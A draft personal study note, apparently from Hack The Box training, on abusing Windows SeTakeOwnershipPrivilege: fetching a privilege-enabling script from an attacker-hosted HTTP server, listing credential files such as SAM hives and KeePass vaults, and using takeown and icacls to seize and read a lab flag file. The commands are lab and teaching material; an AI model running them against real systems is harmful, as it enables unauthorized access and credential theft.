---
created: 2026-02-10
tags:
  - Windows
  - wi
status: draft
---
![[🛠️ Windows privileges#SeTakeOwnerShipPrivilege]]

## Relevant commands

To enable `SeDebugOwnershipPrivilege`, you can use the [`EnableAllTokenPrics.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1) script:

- Download the script and transfer it to the target:

```bash
wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/refs/heads/master/EnableAllTokenPrivs.ps1
```

```bash
python -m http.server 8000
```

```powershell
(New-Object Net.WebClient).DownloadFile("http://<attacker>:8000/EnableAllTokenPrivs.ps1", "EnableAllTokenPrivs.ps1")
```

 - Import module:

```powershell
Import-Module .\Enable-Privilege.ps1
```

- Execute the script:

```powershell
.\EnableAllTokenPrivs.ps1
```

- Confirm it worked:

```powershell
whoami /priv
```

> [!note] The script calls `AdjustTokenPrivileges()` against your current process token, toggling all available privileges to their enabled state. It doesn't grant new privileges — it only enables ones that were already assigned. If the privilege isn't present at all, no script will help you; you need a token with the right assignment.
### Files of interest

Once `SeTakeOwnershipPrivilege` is available (and enabled), the next step is to identify a valuable target.

>[!tip]+
>In real environments, file shares are a common source of sensitive data. For example, you may find `Public` and `Private` directories with subdirectories set up by department — with valuable information inside. 

- Common targets:

```powershell
c:\inetpub\wwwroot\web.config
%WINDIR%\repair\SAM
%WINDIR%\repair\SYSTEM
%WINDIR%\repair\SECURITY
%WINDIR%\system32\config\SAM
%WINDIR%\system32\config\SYSTEM
%WINDIR%\system32\config\SECURITY
%WINDIR%\system32\config\SOFTWARE
%WINDIR%\system32\config\DEFAULT
```

- Other high-value files:
	- `.kdbx` — KeePass databases. Contains a vault of credentials, often including domain admin passwords.
	- `.ovpn` / `.rdp` — VPN and RDP connection configs, sometimes with embedded credentials.
	- `*.ps1`, `*.bat`, `*.cmd` — Scripts frequently contain hardcoded credentials or connection strings.
	- `*.config`, `*.xml`, `*.ini` — Application configs. Look for `<connectionStrings>`, `password=`, `pwd=`.
	- `*pass*`, `*cred*`, `*secret*` — Whatever is in there, it's interesting by name alone.
	- `.vmdk`, `.vhd`, `.vhdx` — Virtual disk images. Mount them and you get a full filesystem to pillage offline.
	- `.one` — OneNote notebooks; often contain paste-dumps of credentials, SSH keys, internal documentation.

- Look for:
	- `password=`
	- `pwd=`
	- `connectionString`
	- API keys, tokens, secret

- Quick enumeration:

```powershell
Get-ChildItem -Path 'C:\Path\To\Directory\' -Recurse -Include *.kdbx,*.config,*pass*,*cred*,*.ps1 -ErrorAction SilentlyContinue
```

### Checking ownership and permissions

- Check permissions and ownership:

```powershell
Get-ChildItem -Path 'C:\Path\To\file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

```powershell
cmd /c dir /q 'C:\Path\To\file.txt'
```
### Taking ownership

- Having the `SeTakeOwnershipPrivilege` enabled, you can change ownership of a target file using the [`takeown`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) command:

```powershell
takeown /f 'C:\Path\To\file.txt'
```

>[!example]+
> ```powershell
> PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
> ```
>  
> ```powershell
> SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
> ```

>[!note] `takeown` is a native Windows binary located at `C:\Windows\System32\takeown.exe`.

- `takeown` works recursively on directories, too:

```powershell
takeown /f 'C:\Path\To\Directory' /r /d y
```

>[!note]+ Option breakdown
>- `/r`: recurse into subdirectories.
>- `/d y`: auto-confirm on directories.

- Verify ownership transferred:

```powershell
Get-ChildItem -Path 'C:\Path\To\file.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
```

>[!warning] **Owning the object does not automatically give you read/write access.** It only means you can now rewrite the DACL.

>[!example]- Example error
> ```powershell
> cat 'C:\Department Shares\Private\IT\cred.txt' 
> ```
> 
> 
> ```powershell
> At line:1 char:1 
> + cat 'C:\Department Shares\Private\IT\cred.txt' 
> + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
> 	+ CategoryInfo : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut horizedAccessException 
> 	+ FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
> ```
### Granting yourself access

- Grant yourself full privileges over the target file: 

```powershell
icacls 'C:\Path\To\file.txt' /grant <username>:F
```
>[!note]  `/grant <username>:F` grants Full Control (`F`). Other permission levels: `R` (Read), `W` (Write), `M` (Modify).

>[!example]-
> ```powershell
> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
> ```
> ```bash
> processed file: C:\Department Shares\Private\IT\cred.txt
> Successfully processed 1 files; Failed processing 0 files
> ```

>[!warning] During a real engagement, obtain proper permissions before changing ownership of sensitive files, as it may disrupt normal work of applications or users.

> [!example]+ Complete example
> - Target file: `C:\TakeOwn\flag.txt`
> 
> ```
> C:\TakeOwn\flag.txt
> ```
> 
> - Check privileges:
> 
> ```powershell
> whoami /priv
> ```
> 
> ```powershell
> PS C:\Windows\system32> whoami /priv
> 
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name                Description                              State
> ============================= ======================================== ========
> SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
> SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
> SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
> ```
> 
> - Check permissions and ownership of the target file:
> 
> ```powershell
> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
> ```
> ```powershell
> FullName            LastWriteTime        Attributes Owner
> --------            -------------        ---------- -----
> C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive
> ```
> 
> - Enable `SeTakeOwnershipPrivilege`:
> 
> 1. Download the script and serve it from pwnbox:
> 
> ```bash
> wget https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/refs/heads/master/EnableAllTokenPrivs.ps1
> ```
> 
> ```bash
> python -m http.server 8000
> ```
> 
> 2. Download the file:
> 
> ```powershell 
> cd C:\Tools
> ```
> 
> ```powershell
> Invoke-WebRequest "http://10.10.14.111:8000/EnableAllTokenPrivs.ps1" -OutFile .\EnableAllTokenPrivs.ps1
> ```
> 
> 3. Run the script:
> 
> ```powershell
> .\EnableAllTokenPrivs.ps1
> ```
> 
> - Check privileges again:
> 
> ```powershell
> whoami /priv
> ```
> 
> ```powershell
> PS C:\Tools> whoami /priv
> ```
> 
> ```powershell
> PRIVILEGES INFORMATION
> ----------------------
> 
> Privilege Name                Description                              State
> ============================= ======================================== =======
> SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
> SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
> SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
> ```
> 
> - Take ownership:
> 
> ```powershell
> takeown /f 'C:\TakeOwn\flag.txt'
> ```
> ```powershell
> 
> SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".
> ```
> 
> - Check permissions and ownership again:
> 
> ```powershell
> Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
> ```
> ```powershell
> FullName            LastWriteTime        Attributes Owner
> --------            -------------        ---------- -----
> C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM    Archive WINLPE-SRV01\htb-student
> ```
> 
> - Attempt to read:
> 
> ```powershell
> cat C:\TakeOwn\flag.txt
> ```
> 
> ```powershell
> cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
> At line:1 char:1
> + cat C:\TakeOwn\flag.txt
> + ~~~~~~~~~~~~~~~~~~~~~~~
>     + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessException
>     + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
> ```
> 
> - Grant your user full privileges over the target file: 
> 
> ```powershell
> icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
> ```
> ```bash
> processed file: C:\TakeOwn\flag.txt
> Successfully processed 1 files; Failed processing 0 files
> ```
> 
> - Read:
> 
> ```powershell
> cat C:\TakeOwn\flag.txt
> ```
> 
> ```powershell
> 1m_th3_f1l3_0wn3r_n0W!
> ```

## References and further reading

- [`Take ownership of files or other objects — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)
- [`Securable Objects — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/securable-objects)
- [`Standard access rights — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/secauthz/standard-access-rights)